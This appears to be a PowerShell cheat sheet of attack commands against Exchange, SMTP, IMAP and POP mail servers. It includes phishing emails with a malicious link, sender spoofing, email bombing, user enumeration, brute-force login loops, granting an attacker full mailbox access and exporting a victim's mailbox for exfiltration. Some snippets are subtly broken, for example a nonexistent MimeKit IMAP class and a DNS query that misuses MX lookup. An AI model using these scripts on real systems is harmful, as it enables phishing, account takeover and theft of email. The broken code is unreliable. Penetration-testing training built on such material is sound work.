### Exchange Server

**Script/Command:**

```powershell
Test-OutlookWebServices -ClientAccessServer mail.snowcapcyber.com -Autodiscover
```

**Description:**

Tests the Autodiscover service on the specified Exchange server to reveal configuration details, which can be used to identify potential vulnerabilities.

**Example:**

Enumerate Autodiscover settings for mail.snowcapcyber.com to assess server configuration.

---

**Script/Command:**

```powershell
Get-User | Select-Object DisplayName, PrimarySmtpAddress
```

**Description:**

Enumerates all email accounts on the Exchange server, listing display names and primary SMTP addresses for user enumeration.

**Example:**

Identify valid email accounts for potential social engineering attacks.

---

**Script/Command:**

```powershell
Get-PublicFolder
```

**Description:**

Lists all public folders on the Exchange server, which may contain sensitive information and serve as an attack surface.

**Example:**

Check for public folders that might expose sensitive data.

---

**Script/Command:**

```powershell
Get-ExchangeServer | Select-Object Name, AdminDisplayVersion
```

**Description:**

Retrieves the Exchange server’s name and version information to identify known vulnerabilities.

**Example:**

Determine the version of mail.snowcapcyber.com to check for outdated software.

---

**Script/Command:**

```powershell
Send-MailMessage -From attacker@snowcapcyber.com -To victim@snowcapcyber.com -Subject "Important: Urgent Action Required" -Body "Click here to reset your password: http://maliciouslink.com" -SmtpServer mail.contoso.com
```

**Description:**

Sends a phishing email to a user on the Exchange server to trick them into revealing sensitive information.

**Example:**

Test phishing effectiveness by sending a mock email to victim@snowcapcyber.com.

---

**Script/Command:**

```powershell
$cred = Get-Credential
$cred.GetNetworkCredential().Password
```

**Description:**

Captures credentials via a prompt and extracts the password for credential harvesting.

**Example:**

Attempt to extract credentials from a compromised user session.

---

**Script/Command:**

```powershell
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.contoso.com/PowerShell/ -Authentication Kerberos
Import-PSSession $Session
Get-Mailbox -User victim@snowcapcyber.com | Get-MailboxStatistics | Format-List LastLoggedOnUserAccount, LastLogonTime
```

**Description:**

Establishes a remote session to the Exchange server and retrieves mailbox access details for the specified user.

**Example:**

Check the last login details for victim@snowcapcyber.com after credential compromise.

---

**Script/Command:**

```powershell
Add-MailboxPermission -User attacker@snowcapcyber.com -AccessRights FullAccess -Identity victim@snowcapcyber.com
```

**Description:**

Grants the attacker full access to the victim’s mailbox for privilege escalation.

**Example:**

Escalate privileges by granting attacker@snowcapcyber.com access to victim@snowcapcyber.com’s mailbox.

---

**Script/Command:**

```powershell
New-MailboxExportRequest -Mailbox victim@snowcapcyber.com -FilePath "\\server\share\export.pst"
```

**Description:**

Exports the victim’s mailbox contents to a PST file for data exfiltration.

**Example:**

Extract emails and data from victim@snowcapcyber.com to \\server\share\export.pst.

---

### SMTP Server

**Script/Command:**

```powershell
Test-NetConnection -ComputerName mail.snowcapcyber.com -Port 25
```

**Description:**

Connects to the SMTP server on port 25 to enumerate the SMTP banner, revealing server identity and version.

**Example:**

Retrieve the banner from mail.snowcapcyber.com to identify the SMTP software version.

---

**Script/Command:**

```powershell
Send-MailMessage -To user@snowcapcyber.com -From attacker@snowcapcyber.com -SmtpServer mail.snowcapcyber.com
```

**Description:**

Tests the existence of an email address by attempting to send a message, useful for SMTP user enumeration.

**Example:**

Verify if user@snowcapcyber.com is a valid address.

---

**Script/Command:**

```powershell
.\Test-SMTPOpenRelay.ps1 -Server mail.snowcapcyber.com
```

**Description:**

Checks if the SMTP server allows unauthorized email relaying (open relay detection).

**Example:**

Test mail.snowcapcyber.com for open relay vulnerabilities.

---

**Script/Command:**

```powershell
Send-MailMessage -To user@snowcapcyber.com -From attacker@snowcapcyber.com -SmtpServer mail.snowcapcyber.com -Port 25 -Body "EHLO"
```

**Description:**

Sends a custom SMTP command (e.g., EHLO) to enumerate supported commands.

**Example:**

Test which SMTP commands are supported by mail.snowcapcyber.com.

---

**Script/Command:**

```powershell
Send-MailMessage -To user@snowcapcyber.com -From ceo@snowcapcyber.com -SmtpServer mail.snowcapcyber.com
```

**Description:**

Sends an email with a spoofed sender address for exploitation.

**Example:**

Spoof an email from ceo@snowcapcyber.com to deceive recipients.

---

**Script/Command:**

```powershell
1..100 | ForEach-Object { Send-MailMessage -To "user@snowcapcyber.com" -From "attacker@snowcapcyber.com" -SmtpServer mail.snowcapcyber.com }
```

**Description:**

Sends multiple emails to overwhelm the SMTP server, simulating an email bombing attack.

**Example:**

Test server resilience by sending 100 emails to user@snowcapcyber.com.

---

**Script/Command:**

```powershell
$email_addresses = "user1@snowcapcyber.com", "user2@snowcapcyber.com", "user3@snowcapcyber.com"
$valid_addresses = @()
foreach ($address in $email_addresses) {
    $result = Send-MailMessage -To $address -From "attacker@snowcapcyber.com" -SmtpServer mail.snowcapcyber.com -ErrorAction SilentlyContinue
    if ($result -eq $null) {
        $valid_addresses += $address
    }
}
Write-Host "Valid Email Addresses: $($valid_addresses -join ', ')"
```

**Description:**

Automates user enumeration by sending emails to a list of addresses and identifying valid ones based on server responses.

**Example:**

Check which of user1, user2, or user3@snowcapcyber.com are valid.

---

**Script/Command:**

```powershell
$passwords = Get-Content "passwords.txt"
$users = Get-Content "users.txt"
foreach ($user in $users) {
    foreach ($password in $passwords) {
        Send-MailMessage -To "user@snowcapcyber.com" -From $user -SmtpServer mail.snowcapcyber.com -Credential (New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString -String $password -AsPlainText -Force)))
    }
}
```

**Description:**

Automates brute-force attacks by attempting various username and password combinations via SMTP.

**Example:**

Test login attempts using users and passwords from users.txt and passwords.txt.

---

**Script/Command:**

```powershell
Send-MailMessage -To "external@snowcapcyber.com" -From "user@snowcapcyber.com" -SmtpServer mail.snowcapcyber.com
```

**Description:**

Tests for mail relay abuse by attempting to send an email to an external recipient.

**Example:**

Check if mail.snowcapcyber.com allows relaying to external@snowcapcyber.com.

---

### IMAP Server

**Script/Command:**

```powershell
Import-Module MailKit
Import-Module MimeKit
$server = "imap.snowcapcyber.com"
$port = 993
$username = "andrewblyth"
$password = "Th1s1sMypa55w0rd"
$imapClient = [MimeKit.Net.Imap.ImapClient]::new()
$imapClient.Connect($server, $port, [System.Security.Authentication.SslProtocols]::Tls)
$imapClient.Authenticate($username, $password)
```

**Description:**

Establishes a connection to the IMAP server for vulnerability testing.

**Example:**

Connect to imap.snowcapcyber.com with credentials to begin testing.

---

**Script/Command:**

```powershell
Resolve-DnsName -Name "imap" -Type MX
```

**Description:**

Enumerates IMAP servers by querying DNS records for mail exchange (MX) records.

**Example:**

Identify potential IMAP servers associated with "imap" domain.

---

**Script/Command:**

```powershell
$MyPasswordList = @("mypasswd1", "mypasswd2")
foreach ($password in $MyPasswordList) {
    try {
        $imapClient.Authenticate($username, $password)
        Write-Host "Successful login: $password"
    } catch {
        # Handle login failures here
    }
}
```

**Description:**

Automates a brute-force attack on the IMAP server using a list of passwords.

**Example:**

Test passwords mypasswd1 and mypasswd2 for username andrewblyth.

---

**Script/Command:**

```powershell
$capabilities = $imapClient.Capabilities
if ($capabilities -contains "STARTTLS") {
    Write-Host "STARTTLS supported"
} else {
    Write-Host "STARTTLS not supported."
    Exit
}
$sslVersion = $imapClient.SslProtocol
Write-Host "Server SSL/TLS version: $sslVersion"
```

**Description:**

Checks the IMAP server’s SSL/TLS configuration for vulnerabilities.

**Example:**

Verify if imap.snowcapcyber.com supports STARTTLS and its SSL version.

---

**Script/Command:**

```powershell
$banner = $imapClient.Banner
Write-Host "IMAP Server Banner: $banner"
```

**Description:**

Performs banner grabbing to extract the IMAP server’s software version and details.

**Example:**

Retrieve the banner from imap.snowcapcyber.com to identify its version.

---

### POP Server

**Script/Command:**

```powershell
Test-NetConnection -ComputerName pop.example.com -CommonTCPPort POP3, POP3S
```

**Description:**

Scans for open ports (POP3 and POP3S) on the POP mail server to identify its attack surface.

**Example:**

Check if pop.example.com has ports 110 (POP3) or 995 (POP3S) open.

---

**Script/Command:**

```powershell
$popServer = "pop.example.com"
$port = 110
$credentials = Get-Credential -Message "Enter POP3 credentials"
try {
    $popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)
    $popStream = $popClient.GetStream()
    $popReader = New-Object System.IO.StreamReader($popStream)
    $popWriter = New-Object System.IO.StreamWriter($popStream)
    $popWriter.WriteLine("USER " + $credentials.UserName)
    $popWriter.WriteLine("PASS " + $credentials.GetNetworkCredential().Password)
    $popWriter.WriteLine("QUIT")
    $response = $popReader.ReadToEnd()
    if ($response -match "OK") {
        Write-Host "Authentication succeeded."
    } else {
        Write-Host "Authentication failed."
    }
    $popClient.Close()
} catch {
    Write-Host "Connection to POP server failed."
}
```

**Description:**

Tests the POP server’s authentication mechanism with provided credentials.

**Example:**

Attempt to authenticate to pop.example.com with user-provided credentials.

---

**Script/Command:**

```powershell
$popServer = "pop.snowcapcyber.com"
$port = 110
$users = "ajcblyth", "jsmith", "pdavies"
$passwords = "password1", "password2", "password3"
foreach ($user in $users) {
    foreach ($password in $passwords) {
        try {
            $popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)
            $popStream = $popClient.GetStream()
            $popReader = New-Object System.IO.StreamReader($popStream)
            $popWriter = New-Object System.IO.StreamWriter($popStream)
            $popWriter.WriteLine("USER " + $user)
            $popWriter.WriteLine("PASS " + $password)
            $popWriter.WriteLine("QUIT")
            $response = $popReader.ReadToEnd()
            if ($response -match "OK") {
                Write-Host "Brute force succeeded. User: $user, Password: $password"
                $popClient.Close()
                Break
            }
            $popClient.Close()
        } catch {
            Write-Host "Connection to POP server failed."
        }
    }
}
```

**Description:**

Simulates a brute-force attack by testing various username and password combinations.

**Example:**

Test login combinations for users ajcblyth, jsmith, pdavies with passwords password1, password2, password3 on pop.snowcapcyber.com.

---

**Script/Command:**

```powershell
$popServer = "pop.snowcapcyber.com"
$port = 110
try {
    $popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)
    $popStream = $popClient.GetStream()
    $popReader = New-Object System.IO.StreamReader($popStream)
    $banner = $popReader.ReadLine()
    Write-Host "Banner: $banner."
    $popClient.Close()
} catch {
    Write-Host "POP Connection failed."
}
```

**Description:**

Performs banner grabbing to retrieve the POP server’s version and configuration details.

**Example:**

Extract the banner from pop.snowcapcyber.com to identify its software version.

---
